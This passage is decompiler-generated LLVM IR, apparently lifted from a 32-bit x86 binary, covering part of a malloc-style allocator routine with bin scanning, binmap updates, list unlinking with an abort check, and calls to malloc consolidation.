dec_label_pc_804fed2:                             ; preds = %dec_label_pc_804fec4
  %v1_804fed4 = or i32 %v0_804fec7, 1
  store i32 %v1_804fed4, i32* %eax.global-to-local, align 4
  store i32 %v3_804feb7, i32* %ebx.global-to-local, align 4
  %v2_804fee8101 = add i32 %v3_804feb7, 4
  %v3_804fee8102 = inttoptr i32 %v2_804fee8101 to i32*
  %v4_804fee8103 = load i32, i32* %v3_804fee8102, align 4
  %v10_804fee8104 = icmp ult i32 %v1_804fed4, %v4_804fee8103
  br i1 %v10_804fee8104, label %dec_label_pc_804fed9, label %dec_label_pc_804feed

dec_label_pc_804fed9:                             ; preds = %dec_label_pc_804fed2, %dec_label_pc_804fed9
  %v0_804feed105 = phi i32 [ %v3_804fedd, %dec_label_pc_804fed9 ], [ %v3_804feb7, %dec_label_pc_804fed2 ]
  store i32 %v0_804feed105, i32* %ecx.global-to-local, align 4
  %v1_804fedd = add i32 %v0_804feed105, 8
  %v2_804fedd = inttoptr i32 %v1_804fedd to i32*
  %v3_804fedd = load i32, i32* %v2_804fedd, align 4
  store i32 %v3_804fedd, i32* %ecx.global-to-local, align 4
  store i32 %v3_804fedd, i32* %ebx.global-to-local, align 4
  %v2_804fee8 = add i32 %v3_804fedd, 4
  %v3_804fee8 = inttoptr i32 %v2_804fee8 to i32*
  %v4_804fee8 = load i32, i32* %v3_804fee8, align 4
  %v10_804fee8 = icmp ult i32 %v1_804fed4, %v4_804fee8
  br i1 %v10_804fee8, label %dec_label_pc_804fed9, label %dec_label_pc_804feed

dec_label_pc_804feed:                             ; preds = %dec_label_pc_804fed9, %dec_label_pc_804fed2
  %v0_804feed.lcssa = phi i32 [ %v3_804feb7, %dec_label_pc_804fed2 ], [ %v3_804fedd, %dec_label_pc_804fed9 ]
  %v1_804feed = add i32 %v0_804feed.lcssa, 12
  %v2_804feed = inttoptr i32 %v1_804feed to i32*
  %v3_804feed = load i32, i32* %v2_804feed, align 4
  store i32 %v3_804feed, i32* @ebx, align 4
  br label %dec_label_pc_804fef0

dec_label_pc_804fef0:                             ; preds = %dec_label_pc_804fe96, %dec_label_pc_804fec4, %dec_label_pc_804fea7, %dec_label_pc_804feed
  %v0_804fef0 = phi i32 [ %v0_804fea9, %dec_label_pc_804fea7 ], [ %v0_804fea9, %dec_label_pc_804feed ], [ %v0_804fea9, %dec_label_pc_804fec4 ], [ %v2_804fe98, %dec_label_pc_804fe96 ]
  %stack_var_-64.1 = phi i32 [ %v2_804feb0, %dec_label_pc_804fea7 ], [ %v0_804feed.lcssa, %dec_label_pc_804feed ], [ %v2_804feb0, %dec_label_pc_804fec4 ], [ %v3_804fea2, %dec_label_pc_804fe96 ]
  %v1_804fef2 = urem i32 %v0_804fef0, 32
  %v2_804fef2 = icmp eq i32 %v1_804fef2, 0
  store i32 %v1_804fef2, i32* %esi.global-to-local, align 4
  store i32 %v1_804fef2, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804fefc = sdiv i32 %v0_804fef0, 32
  store i32 %v2_804fefc, i32* %edx.global-to-local, align 4
  br i1 %v2_804fef2, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804fef0
  %v5_804feff = shl i32 1, %v1_804fef2
  store i32 %v5_804feff, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804fef0, %bb
  %v5_804ff01 = phi i32 [ 1, %dec_label_pc_804fef0 ], [ %v5_804feff, %bb ]
  %v1_804ff01 = mul nsw i32 %v2_804fefc, 4
  %v2_804ff01 = add i32 %v1_804ff01, ptrtoint (i32* @global_var_8060154.230 to i32)
  %v3_804ff01 = inttoptr i32 %v2_804ff01 to i32*
  %v4_804ff01 = load i32, i32* %v3_804ff01, align 4
  %v6_804ff01 = or i32 %v4_804ff01, %v5_804ff01
  store i32 %v6_804ff01, i32* %v3_804ff01, align 4
  %v0_804ff08 = load i32, i32* @ebx, align 4
  %v1_804ff08 = load i32, i32* @ebp, align 4
  %v2_804ff08 = add i32 %v1_804ff08, 12
  %v3_804ff08 = inttoptr i32 %v2_804ff08 to i32*
  store i32 %v0_804ff08, i32* %v3_804ff08, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804ff0f = load i32, i32* @ebp, align 4
  %v2_804ff0f = add i32 %v1_804ff0f, 8
  %v3_804ff0f = inttoptr i32 %v2_804ff0f to i32*
  store i32 %stack_var_-64.1, i32* %v3_804ff0f, align 4
  %v0_804ff12 = load i32, i32* @ebp, align 4
  %v1_804ff12 = load i32, i32* @ebx, align 4
  %v2_804ff12 = add i32 %v1_804ff12, 8
  %v3_804ff12 = inttoptr i32 %v2_804ff12 to i32*
  store i32 %v0_804ff12, i32* %v3_804ff12, align 4
  %v0_804ff15 = load i32, i32* @ebp, align 4
  %v1_804ff15 = load i32, i32* @esi, align 4
  %v2_804ff15 = add i32 %v1_804ff15, 12
  %v3_804ff15 = inttoptr i32 %v2_804ff15 to i32*
  store i32 %v0_804ff15, i32* %v3_804ff15, align 4
  %v0_804ff18 = load i32, i32* @global_var_805fe60.229, align 32
  store i32 %v0_804ff18, i32* @ebp, align 4
  %v9_804ff1e = icmp eq i32 %v0_804ff18, 134610516
  %v1_804ff24 = icmp eq i1 %v9_804ff1e, false
  br i1 %v1_804ff24, label %dec_label_pc_804fe47, label %dec_label_pc_804ff2a

dec_label_pc_804ff2a:                             ; preds = %bb84, %dec_label_pc_804ff18.preheader
  br i1 %v8_804fddb, label %dec_label_pc_804ffb8, label %dec_label_pc_804ff38

dec_label_pc_804ff38:                             ; preds = %dec_label_pc_804ff2a
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804ff3c = mul i32 %stack_var_-40.0.ph, 8
  %v2_804ff3c = add i32 %v1_804ff3c, ptrtoint (i32* @global_var_805fe4c.226 to i32)
  store i32 %v2_804ff3c, i32* %edx.global-to-local, align 4
  %v1_804ff43 = add i32 %v1_804ff3c, add (i32 ptrtoint (i32* @global_var_805fe4c.226 to i32), i32 12)
  %v2_804ff43 = inttoptr i32 %v1_804ff43 to i32*
  %storemerge1.pre = load i32, i32* %v2_804ff43, align 4
  br label %dec_label_pc_804ffb4

dec_label_pc_804ff48:                             ; preds = %dec_label_pc_804ffb4
  %v1_804ff48 = add i32 %v4_804ff5f, 4
  %v2_804ff48 = inttoptr i32 %v1_804ff48 to i32*
  %v3_804ff48 = load i32, i32* %v2_804ff48, align 4
  store i32 %v3_804ff48, i32* %ebx.global-to-local, align 4
  %v1_804ff4b = add i32 %v4_804ff5f, 12
  %v2_804ff4b = inttoptr i32 %v1_804ff4b to i32*
  %v3_804ff4b = load i32, i32* %v2_804ff4b, align 4
  store i32 %v3_804ff4b, i32* @ecx, align 4
  %v1_804ff4e = and i32 %v3_804ff48, -4
  store i32 %v1_804ff4e, i32* @ebx, align 4
  %v10_804ff51 = icmp ult i32 %v1_804ff4e, %v1_805012a
  br i1 %v10_804ff51, label %dec_label_pc_804ffb4, label %dec_label_pc_804ff57

dec_label_pc_804ff57:                             ; preds = %dec_label_pc_804ff48
  %v1_804ff57 = add i32 %v4_804ff5f, 8
  %v2_804ff57 = inttoptr i32 %v1_804ff57 to i32*
  %v3_804ff57 = load i32, i32* %v2_804ff57, align 4
  store i32 %v3_804ff57, i32* @edx, align 4
  %v1_804ff5a = add i32 %v3_804ff57, 12
  %v2_804ff5a = inttoptr i32 %v1_804ff5a to i32*
  %v3_804ff5a = load i32, i32* %v2_804ff5a, align 4
  %v15_804ff5a = icmp eq i32 %v3_804ff5a, %v4_804ff5f
  %v1_804ff5d = icmp eq i1 %v15_804ff5a, false
  br i1 %v1_804ff5d, label %dec_label_pc_804ff64, label %dec_label_pc_804ff5f

dec_label_pc_804ff5f:                             ; preds = %dec_label_pc_804ff57
  %v1_804ff5f = add i32 %v3_804ff4b, 8
  %v2_804ff5f = inttoptr i32 %v1_804ff5f to i32*
  %v3_804ff5f = load i32, i32* %v2_804ff5f, align 4
  %v15_804ff5f = icmp eq i32 %v3_804ff5f, %v4_804ff5f
  br i1 %v15_804ff5f, label %dec_label_pc_804ff69, label %dec_label_pc_804ff64

dec_label_pc_804ff64:                             ; preds = %dec_label_pc_804ff5f, %dec_label_pc_804ff57
  %v0_804ff64 = call i32 @abort()
  store i32 %v0_804ff64, i32* %eax.global-to-local, align 4
  %v0_804ff69.pre = load i32, i32* @ebx, align 4
  %v0_804ff6f.pre = load i32, i32* @ecx, align 4
  %v1_804ff6f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ff69

dec_label_pc_804ff69:                             ; preds = %dec_label_pc_804ff5f, %dec_label_pc_804ff64
  %v1_804ff6f = phi i32 [ %v3_804ff57, %dec_label_pc_804ff5f ], [ %v1_804ff6f.pre, %dec_label_pc_804ff64 ]
  %v0_804ff6f = phi i32 [ %v3_804ff4b, %dec_label_pc_804ff5f ], [ %v0_804ff6f.pre, %dec_label_pc_804ff64 ]
  %v0_804ff69 = phi i32 [ %v1_804ff4e, %dec_label_pc_804ff5f ], [ %v0_804ff69.pre, %dec_label_pc_804ff64 ]
  %v5_804ff6b = sub i32 %v0_804ff69, %v1_805012a
  store i32 %v5_804ff6b, i32* %esi.global-to-local, align 4
  %v2_804ff6f = add i32 %v1_804ff6f, 12
  %v3_804ff6f = inttoptr i32 %v2_804ff6f to i32*
  store i32 %v0_804ff6f, i32* %v3_804ff6f, align 4
  %v0_804ff72 = load i32, i32* @edx, align 4
  %v1_804ff72 = load i32, i32* @ecx, align 4
  %v2_804ff72 = add i32 %v1_804ff72, 8
  %v3_804ff72 = inttoptr i32 %v2_804ff72 to i32*
  store i32 %v0_804ff72, i32* %v3_804ff72, align 4
  %v0_804ff75 = load i32, i32* %esi.global-to-local, align 4
  %v0_804ff78 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ff78 = add i32 %v0_804ff78, 8
  store i32 %v1_804ff78, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_804ff75, 16
  br i1 %tmp127, label %dec_label_pc_8050479, label %dec_label_pc_804ff81

dec_label_pc_804ff81:                             ; preds = %dec_label_pc_804ff69
  %v2_804ff85 = add i32 %v0_804ff78, %v1_805012a
  store i32 %v2_804ff85, i32* @edx, align 4
  %v1_804ff88 = or i32 %v1_805012a, 1
  store i32 %v1_804ff88, i32* %ebx.global-to-local, align 4
  %v2_804ff8b = add i32 %v0_804ff78, 4
  %v3_804ff8b = inttoptr i32 %v2_804ff8b to i32*
  store i32 %v1_804ff88, i32* %v3_804ff8b, align 4
  %v0_804ff8e = load i32, i32* %esi.global-to-local, align 4
  %v1_804ff90 = or i32 %v0_804ff8e, 1
  store i32 %v1_804ff90, i32* %eax.global-to-local, align 4
  %v0_804ff93 = load i32, i32* @edx, align 4
  %v1_804ff93 = load i32, i32* @ebp, align 4
  %v2_804ff93 = add i32 %v1_804ff93, 8
  %v3_804ff93 = inttoptr i32 %v2_804ff93 to i32*
  store i32 %v0_804ff93, i32* %v3_804ff93, align 4
  %v0_804ff96 = load i32, i32* @edx, align 4
  %v1_804ff96 = load i32, i32* @ebp, align 4
  %v2_804ff96 = add i32 %v1_804ff96, 12
  %v3_804ff96 = inttoptr i32 %v2_804ff96 to i32*
  store i32 %v0_804ff96, i32* %v3_804ff96, align 4
  %v0_804ff99 = load i32, i32* @edx, align 4
  %v1_804ff99 = add i32 %v0_804ff99, 8
  %v2_804ff99 = inttoptr i32 %v1_804ff99 to i32*
  store i32 ptrtoint (i32* @global_var_805fe54.228 to i32), i32* %v2_804ff99, align 4
  %v0_804ffa0 = load i32, i32* @edx, align 4
  %v1_804ffa0 = add i32 %v0_804ffa0, 12
  %v2_804ffa0 = inttoptr i32 %v1_804ffa0 to i32*
  store i32 ptrtoint (i32* @global_var_805fe54.228 to i32), i32* %v2_804ffa0, align 4
  %v0_804ffa7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ffa7 = load i32, i32* @edx, align 4
  %v2_804ffa7 = add i32 %v1_804ffa7, 4
  %v3_804ffa7 = inttoptr i32 %v2_804ffa7 to i32*
  store i32 %v0_804ffa7, i32* %v3_804ffa7, align 4
  %v0_804ffaa = load i32, i32* %esi.global-to-local, align 4
  %v1_804ffaa = load i32, i32* @edx, align 4
  %v3_804ffaa = add i32 %v1_804ffaa, %v0_804ffaa
  %v4_804ffaa = inttoptr i32 %v3_804ffaa to i32*
  store i32 %v0_804ffaa, i32* %v4_804ffaa, align 4
  br label %dec_label_pc_805047e

dec_label_pc_804ffb4:                             ; preds = %dec_label_pc_804ff48, %dec_label_pc_804ff38
  %v4_804ff5f = phi i32 [ %storemerge1.pre, %dec_label_pc_804ff38 ], [ %v3_804ff4b, %dec_label_pc_804ff48 ]
  store i32 %v4_804ff5f, i32* %eax.global-to-local, align 4
  %v12_804ffb4 = icmp eq i32 %v4_804ff5f, %v2_804ff3c
  %v1_804ffb6 = icmp eq i1 %v12_804ffb4, false
  br i1 %v1_804ffb6, label %dec_label_pc_804ff48, label %dec_label_pc_804ffb8.loopexit

dec_label_pc_804ffb8.loopexit:                    ; preds = %dec_label_pc_804ffb4
  br label %dec_label_pc_804ffb8

dec_label_pc_804ffb8:                             ; preds = %dec_label_pc_804ffb8.loopexit, %dec_label_pc_804ff2a
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804ffc1 = add i32 %stack_var_-40.0.ph, 1
  %v2_804ffc4 = udiv i32 %v1_804ffc1, 32
  store i32 %v2_804ffc4, i32* @edi, align 4
  %v1_804ffc7 = mul i32 %v1_804ffc1, 8
  %v2_804ffc7 = add i32 %v1_804ffc7, ptrtoint (i32* @global_var_805fe4c.226 to i32)
  store i32 %v2_804ffc7, i32* %ebx.global-to-local, align 4
  %v1_804ffce = urem i32 %v1_804ffc1, 32
  %v2_804ffce = icmp eq i32 %v1_804ffce, 0
  store i32 %v1_804ffce, i32* %ecx.global-to-local, align 4
  %v1_804ffd1 = mul nuw nsw i32 %v2_804ffc4, 4
  %v2_804ffd1 = add i32 %v1_804ffd1, ptrtoint (i32* @global_var_8060154.230 to i32)
  %v3_804ffd1 = inttoptr i32 %v2_804ffd1 to i32*
  %v4_804ffd1 = load i32, i32* %v3_804ffd1, align 4
  store i32 %v4_804ffd1, i32* %edx.global-to-local, align 4
  br i1 %v2_804ffce, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_804ffb8
  %v5_804ffd8 = shl i32 1, %v1_804ffce
  store i32 %v5_804ffd8, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804ffb8, %bb85, %dec_label_pc_8050019
  %v1_804ffda = phi i32 [ %v1_804ffda.pre, %dec_label_pc_8050019 ], [ %v4_804ffd1, %bb85 ], [ %v4_804ffd1, %dec_label_pc_804ffb8 ]
  %v0_804ffde = phi i32 [ %v0_804ffda.pre, %dec_label_pc_8050019 ], [ %v5_804ffd8, %bb85 ], [ 1, %dec_label_pc_804ffb8 ]
  %tmp86 = icmp ule i32 %v0_804ffde, %v1_804ffda
  %v1_804ffde = icmp eq i32 %v0_804ffde, 0
  %v1_804ffe0 = icmp eq i1 %v1_804ffde, false
  %or.cond = and i1 %tmp86, %v1_804ffe0
  br i1 %or.cond, label %dec_label_pc_804ffde.dec_label_pc_805000e.preheader_crit_edge, label %dec_label_pc_804ffe2.preheader

dec_label_pc_804ffde.dec_label_pc_805000e.preheader_crit_edge: ; preds = %.preheader
  %v0_805000912.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805000e.preheader

dec_label_pc_804ffe2.preheader:                   ; preds = %.preheader
  %v0_804ffe2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ffe2

dec_label_pc_804ffe2:                             ; preds = %dec_label_pc_804ffe2.preheader, %dec_label_pc_804ffec
  %v0_804ffe2 = phi i32 [ %v0_804ffe2.pre, %dec_label_pc_804ffe2.preheader ], [ %v1_804ffe2, %dec_label_pc_804ffec ]
  %v1_804ffe2 = add i32 %v0_804ffe2, 1
  store i32 %v1_804ffe2, i32* @edi, align 4
  %v6_804ffe6 = icmp ugt i32 %v1_804ffe2, 2
  br i1 %v6_804ffe6, label %dec_label_pc_8050095.loopexit, label %dec_label_pc_804ffec

dec_label_pc_804ffec:                             ; preds = %dec_label_pc_804ffe2
  %v1_804ffec = mul i32 %v1_804ffe2, 4
  %v2_804ffec = add i32 %v1_804ffec, ptrtoint (i32* @global_var_8060154.230 to i32)
  %v3_804ffec = inttoptr i32 %v2_804ffec to i32*
  %v4_804ffec = load i32, i32* %v3_804ffec, align 4
  store i32 %v4_804ffec, i32* %edx.global-to-local, align 4
  %v1_804fff3 = icmp eq i32 %v4_804ffec, 0
  br i1 %v1_804fff3, label %dec_label_pc_804ffe2, label %dec_label_pc_804fff7

dec_label_pc_804fff7:                             ; preds = %dec_label_pc_804ffec
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804fffe = mul i32 %v1_804ffe2, 256
  store i32 %v2_804fffe, i32* %eax.global-to-local, align 4
  %v1_8050001 = add i32 %v2_804fffe, ptrtoint (i32* @global_var_805fe4c.226 to i32)
  store i32 %v1_8050001, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805000e.preheader

dec_label_pc_805000e.preheader:                   ; preds = %dec_label_pc_804ffde.dec_label_pc_805000e.preheader_crit_edge, %dec_label_pc_804fff7
  %v0_805000912 = phi i32 [ %v1_8050001, %dec_label_pc_804fff7 ], [ %v0_805000912.pre, %dec_label_pc_804ffde.dec_label_pc_805000e.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804fff7 ], [ %v0_804ffde, %dec_label_pc_804ffde.dec_label_pc_805000e.preheader_crit_edge ]
  %v0_8050020 = phi i32 [ %v4_804ffec, %dec_label_pc_804fff7 ], [ %v1_804ffda, %dec_label_pc_804ffde.dec_label_pc_805000e.preheader_crit_edge ]
  %v2_805000e4 = and i32 %v0_8050020, %esi.promoted
  %v3_805000e5 = icmp eq i32 %v2_805000e4, 0
  br i1 %v3_805000e5, label %dec_label_pc_8050009, label %dec_label_pc_8050012

dec_label_pc_8050009:                             ; preds = %dec_label_pc_805000e.preheader, %dec_label_pc_8050009
  %v2_805000c14 = phi i32 [ %v2_805000c, %dec_label_pc_8050009 ], [ %esi.promoted, %dec_label_pc_805000e.preheader ]
  %v0_805000913 = phi i32 [ %v1_8050009, %dec_label_pc_8050009 ], [ %v0_805000912, %dec_label_pc_805000e.preheader ]
  %v1_8050009 = add i32 %v0_805000913, 8
  %v2_805000c = mul i32 %v2_805000c14, 2
  %v2_805000e = and i32 %v2_805000c, %v0_8050020
  %v3_805000e = icmp eq i32 %v2_805000e, 0
  br i1 %v3_805000e, label %dec_label_pc_8050009, label %dec_label_pc_805000e.dec_label_pc_8050012_crit_edge

dec_label_pc_805000e.dec_label_pc_8050012_crit_edge: ; preds = %dec_label_pc_8050009
  store i32 %v1_8050009, i32* %ebx.global-to-local, align 4
  store i32 %v2_805000c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050012

dec_label_pc_8050012:                             ; preds = %dec_label_pc_805000e.dec_label_pc_8050012_crit_edge, %dec_label_pc_805000e.preheader
  %v0_8050022 = phi i32 [ %v2_805000c, %dec_label_pc_805000e.dec_label_pc_8050012_crit_edge ], [ %esi.promoted, %dec_label_pc_805000e.preheader ]
  %v1_805003c = phi i32 [ %v1_8050009, %dec_label_pc_805000e.dec_label_pc_8050012_crit_edge ], [ %v0_805000912, %dec_label_pc_805000e.preheader ]
  %v1_8050012 = add i32 %v1_805003c, 12
  %v2_8050012 = inttoptr i32 %v1_8050012 to i32*
  %v3_8050012 = load i32, i32* %v2_8050012, align 4
  store i32 %v3_8050012, i32* @ecx, align 4
  %v12_8050015 = icmp eq i32 %v3_8050012, %v1_805003c
  %v1_8050017 = icmp eq i1 %v12_8050015, false
  br i1 %v1_8050017, label %dec_label_pc_805002d, label %dec_label_pc_8050019

dec_label_pc_8050019:                             ; preds = %dec_label_pc_8050012
  %v1_805001b = add i32 %v3_8050012, 8
  store i32 %v1_805001b, i32* %ebx.global-to-local, align 4
  %v1_805001e = sub i32 -1, %v0_8050022
  store i32 %v1_805001e, i32* %eax.global-to-local, align 4
  %v2_8050020 = and i32 %v0_8050020, %v1_805001e
  store i32 %v2_8050020, i32* %edx.global-to-local, align 4
  %v2_8050022 = mul i32 %v0_8050022, 2
  store i32 %v2_8050022, i32* %esi.global-to-local, align 4
  %v1_8050024 = load i32, i32* @edi, align 4
  %v2_8050024 = mul i32 %v1_8050024, 4
  %v3_8050024 = add i32 %v2_8050024, ptrtoint (i32* @global_var_8060154.230 to i32)
  %v4_8050024 = inttoptr i32 %v3_8050024 to i32*
  store i32 %v2_8050020, i32* %v4_8050024, align 4
  %v0_804ffda.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804ffda.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_805002d:                             ; preds = %dec_label_pc_8050012
  %v1_805002d = add i32 %v3_8050012, 4
  %v2_805002d = inttoptr i32 %v1_805002d to i32*
  %v3_805002d = load i32, i32* %v2_805002d, align 4
  store i32 %v3_805002d, i32* %edx.global-to-local, align 4
  %v1_8050030 = add i32 %v3_8050012, 12
  %v2_8050030 = inttoptr i32 %v1_8050030 to i32*
  %v3_8050030 = load i32, i32* %v2_8050030, align 4
  store i32 %v3_8050030, i32* %eax.global-to-local, align 4
  %v1_8050033 = and i32 %v3_805002d, -4
  store i32 %v1_8050033, i32* @edx, align 4
  %v5_8050038 = sub i32 %v1_8050033, %v1_805012a
  store i32 %v5_8050038, i32* %esi.global-to-local, align 4
  store i32 %v3_8050030, i32* %v2_8050012, align 4
  %v0_805003f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805003f = load i32, i32* %eax.global-to-local, align 4
  %v2_805003f = add i32 %v1_805003f, 8
  %v3_805003f = inttoptr i32 %v2_805003f to i32*
  store i32 %v0_805003f, i32* %v3_805003f, align 4
  %v0_8050042 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_8050042, 16
  br i1 %tmp128, label %dec_label_pc_8050047, label %dec_label_pc_805004e

dec_label_pc_8050047:                             ; preds = %dec_label_pc_805002d
  %v0_8050047 = load i32, i32* @ecx, align 4
  %v1_8050047 = load i32, i32* @edx, align 4
  %v2_8050047 = add i32 %v0_8050047, 4
  %v3_8050047 = add i32 %v2_8050047, %v1_8050047
  %v4_8050047 = inttoptr i32 %v3_8050047 to i32*
  %v5_8050047 = load i32, i32* %v4_8050047, align 4
  %v6_8050047 = or i32 %v5_8050047, 1
  store i32 %v6_8050047, i32* %v4_8050047, align 4
  br label %dec_label_pc_805008d

dec_label_pc_805004e:                             ; preds = %dec_label_pc_805002d
  store i32 %v1_805012a, i32* %eax.global-to-local, align 4
  %v0_8050057 = load i32, i32* @ecx, align 4
  %v2_8050057 = add i32 %v0_8050057, %v1_805012a
  store i32 %v2_8050057, i32* @edx, align 4
  %v1_805005a = load i32, i32* @ebp, align 4
  %v2_805005a = add i32 %v1_805005a, 8
  %v3_805005a = inttoptr i32 %v2_805005a to i32*
  store i32 %v2_8050057, i32* %v3_805005a, align 4
  %v0_805005d = load i32, i32* @edx, align 4
  %v1_805005d = load i32, i32* @ebp, align 4
  %v2_805005d = add i32 %v1_805005d, 12
  %v3_805005d = inttoptr i32 %v2_805005d to i32*
  store i32 %v0_805005d, i32* %v3_805005d, align 4
  %v0_8050060 = load i32, i32* @edx, align 4
  %v1_8050060 = add i32 %v0_8050060, 8
  %v2_8050060 = inttoptr i32 %v1_8050060 to i32*
  store i32 ptrtoint (i32* @global_var_805fe54.228 to i32), i32* %v2_8050060, align 4
  %v0_8050067 = load i32, i32* @edx, align 4
  %v1_8050067 = add i32 %v0_8050067, 12
  %v2_8050067 = inttoptr i32 %v1_8050067 to i32*
  store i32 ptrtoint (i32* @global_var_805fe54.228 to i32), i32* %v2_8050067, align 4
  br i1 %v6_804fde3, label %dec_label_pc_8050076, label %dec_label_pc_8050070

dec_label_pc_8050070:                             ; preds = %dec_label_pc_805004e
  %v0_8050070 = load i32, i32* @edx, align 4
  store i32 %v0_8050070, i32* @global_var_805fe50.227, align 16
  br label %dec_label_pc_8050076

dec_label_pc_8050076:                             ; preds = %dec_label_pc_805004e, %dec_label_pc_8050070
  %v4_8050076 = or i32 %v1_805012a, 1
  %v0_805007b = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8050076, i32* %ebx.global-to-local, align 4
  %v1_8050081 = or i32 %v0_805007b, 1
  store i32 %v1_8050081, i32* %eax.global-to-local, align 4
  %v1_8050084 = load i32, i32* @ecx, align 4
  %v2_8050084 = add i32 %v1_8050084, 4
  %v3_8050084 = inttoptr i32 %v2_8050084 to i32*
  store i32 %v4_8050076, i32* %v3_8050084, align 4
  %v0_8050087 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050087 = load i32, i32* @edx, align 4
  %v3_8050087 = add i32 %v1_8050087, %v0_8050087
  %v4_8050087 = inttoptr i32 %v3_8050087 to i32*
  store i32 %v0_8050087, i32* %v4_8050087, align 4
  %v0_805008a = load i32, i32* %eax.global-to-local, align 4
  %v1_805008a = load i32, i32* @edx, align 4
  %v2_805008a = add i32 %v1_805008a, 4
  %v3_805008a = inttoptr i32 %v2_805008a to i32*
  store i32 %v0_805008a, i32* %v3_805008a, align 4
  br label %dec_label_pc_805008d

dec_label_pc_805008d:                             ; preds = %dec_label_pc_8050047, %dec_label_pc_8050076
  %v0_805008d = load i32, i32* @ecx, align 4
  %v1_805008d = add i32 %v0_805008d, 8
  store i32 %v1_805008d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805048f

dec_label_pc_8050095.loopexit:                    ; preds = %dec_label_pc_804ffe2
  br label %dec_label_pc_8050095

dec_label_pc_8050095:                             ; preds = %dec_label_pc_8050095.loopexit, %dec_label_pc_804fd9d, %dec_label_pc_804fda5
  %v0_8050095 = load i32, i32* @global_var_805fe4c.226, align 4
  store i32 %v0_8050095, i32* @ebx, align 4
  %v1_805009f = add i32 %v1_805012a, 16
  store i32 %v1_805009f, i32* @esi, align 4
  %v1_80500a2 = add i32 %v0_8050095, 4
  %v2_80500a2 = inttoptr i32 %v1_80500a2 to i32*
  %v3_80500a2 = load i32, i32* %v2_80500a2, align 4
  %v1_80500a9 = and i32 %v3_80500a2, -4
  store i32 %v1_80500a9, i32* %ecx.global-to-local, align 4
  %v7_80500ac = icmp ult i32 %v1_80500a9, %v1_805009f
  br i1 %v7_80500ac, label %dec_label_pc_80500cc, label %dec_label_pc_80500b0

dec_label_pc_80500b0:                             ; preds = %dec_label_pc_8050095
  %v2_80500b4 = add i32 %v0_8050095, %v1_805012a
  store i32 %v2_80500b4, i32* @edx, align 4
  %v1_80500b7 = or i32 %v1_805012a, 1
  store i32 %v1_80500b7, i32* %eax.global-to-local, align 4
  store i32 %v2_80500b4, i32* @global_var_805fe4c.226, align 4
  store i32 %v1_80500b7, i32* %v2_80500a2, align 4
  %v0_80500c3 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80500c3 = sub i32 %v0_80500c3, %v1_805012a
  store i32 %v5_80500c3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805041f

dec_label_pc_80500cc:                             ; preds = %dec_label_pc_8050095
  %v0_80500cc = load i32, i32* @global_var_806017c.231, align 4
  store i32 %v0_80500cc, i32* %edx.global-to-local, align 4
  %v0_80500d2 = load i8, i8* @global_var_805fe20.225, align 32
  %v1_80500d2 = and i8 %v0_80500d2, 2
  %v2_80500d2 = icmp eq i8 %v1_80500d2, 0
  br i1 %v2_80500d2, label %dec_label_pc_8050100, label %dec_label_pc_80500db

dec_label_pc_80500db:                             ; preds = %dec_label_pc_80500cc
  store i32 ptrtoint (i8* @global_var_805fe20.225 to i32), i32* %stack_var_-92, align 4
  %v2_80500e3 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805fe20.225 to i32*))
  store i32 ptrtoint (i8* @global_var_805fe20.225 to i32), i32* @ebx, align 4
  %v1_80500ed = add i32 %v1_805012a, -7
  store i32 %v1_80500ed, i32* %eax.global-to-local, align 4
  store i32 %v1_80500ed, i32* %stack_var_-92, align 4
  %v1_80500f1 = call i32 @malloc(i32 %v1_80500ed)
  store i32 %v1_80500f1, i32* %eax.global-to-local, align 4
  store i32 %v1_80500f1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805048f

dec_label_pc_8050100:                             ; preds = %dec_label_pc_80500cc
  %v1_8050100 = add i32 %v0_80500cc, -1
  store i32 %v1_8050100, i32* @ecx, align 4
  store i32 %v1_805012a, i32* @ebx, align 4
  %v1_805010b = load i32, i32* @global_var_806016c.232, align 4
  %v7_805010b = icmp ult i32 %v1_805012a, %v1_805010b
  br i1 %v7_805010b, label %dec_label_pc_80501cd, label %dec_label_pc_8050117

dec_label_pc_8050117:                             ; preds = %dec_label_pc_8050100
  %v0_8050117 = load i32, i32* @global_var_8060170.233, align 16
  store i32 %v0_8050117, i32* %eax.global-to-local, align 4
  %v1_805011c = load i32, i32* @global_var_8060174.234, align 4
  %v5_8050122 = icmp slt i32 %v0_8050117, %v1_805011c
  br i1 %v5_8050122, label %dec_label_pc_8050128, label %dec_label_pc_80501cd

dec_label_pc_8050128:                             ; preds = %dec_label_pc_8050117
  %v2_805012a = add i32 %v1_805012a, 10
  %v3_805012a = add i32 %v2_805012a, %v0_80500cc
  %v1_805012e = sub i32 0, %v0_80500cc
  store i32 %v1_805012e, i32* %eax.global-to-local, align 4
  %v2_8050130 = and i32 %v3_805012a, %v1_805012e
  store i32 %v2_8050130, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_8050130, %v1_805012a
